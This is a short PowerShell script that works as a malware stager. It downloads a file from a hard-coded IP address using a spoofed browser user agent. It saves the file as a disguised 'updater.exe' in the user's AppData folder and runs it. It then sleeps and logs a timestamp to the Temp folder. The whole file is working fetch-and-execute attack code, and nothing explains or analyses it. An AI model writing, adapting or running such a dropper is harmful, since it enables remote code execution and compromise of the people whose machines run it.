[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://198.51.100.225/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$TransferTimeout = 29,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Invoke-Stage2Download -SourceUrl $FetchUrl -DestinationPath $Stage2Path -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
if ($OperationResult) {
    Start-Process -FilePath $Stage2Path
}

Start-Sleep -Seconds 23
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
